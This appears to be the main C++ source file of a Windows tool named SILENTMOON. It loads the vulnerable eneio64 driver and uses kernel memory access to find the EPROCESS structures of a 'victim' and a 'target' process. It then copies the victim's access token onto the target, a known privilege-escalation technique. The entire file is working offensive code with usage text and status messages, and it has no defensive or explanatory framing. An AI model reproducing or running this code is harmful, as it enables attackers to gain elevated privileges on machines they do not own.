#include "eneio64.hpp"
#include "vdm.hpp"

#include <format>
#include <iostream>

void exit(const std::unique_ptr<eneio64>& eneio) {
    eneio->cleanup();
    std::exit(1);
}

int32_t main(int32_t argc, const char** argv) {
    if (argc != 3) {
        std::cout << "Usage: SILENTMOON.exe <victim_pid> <target_pid>" << std::endl;
        return 1;
    }

    const auto victim_pid = std::stoi(argv[1]);

    const auto target_pid = std::stoi(argv[2]);
    if (target_pid == SYSTEM_PID) {
        std::cout << std::format("[!] Unable to overwrite ntoskrnl token! {}", target_pid) << std::endl;
        return 1;
    }

    const auto eneio = std::make_shared<eneio64>();
    if (!eneio->initialize()) {
        std::cout << "[!] Failed to communicate with driver" << std::endl;
        return 1;
    }

    const auto vdm = std::make_shared<::vdm>(eneio);
    if (!vdm->initialize()) {
        std::cout << "[!] Failed to initialize VDM" << std::endl;
        return 1;
    }

    const auto victim_e_process = vdm->fetch_e_process(victim_pid);
    if (!victim_e_process) {
        std::cout << "[!] Failed to fetch victim process EProcess" << std::endl;
        return 1;
    }

    std::cout << std::format("[*] Victim process EProcess: 0x{:X}", victim_e_process) << std::endl;

    const auto target_e_process = vdm->fetch_e_process(target_pid);
    if (!target_e_process) {
        std::cout << "[!] Failed to fetch target process EProcess" << std::endl;
        return 1;
    }

    std::cout << std::format("[*] Target process EProcess: 0x{:X}", target_e_process) << std::endl;

    if (!vdm->steal_token(victim_e_process, target_e_process)) {
        std::cout << "[!] Failed to steal victim process token" << std::endl;
        return 1;
    }

    std::cout << "[*] Victim process token stolen!" << std::endl;
    return 0;
}
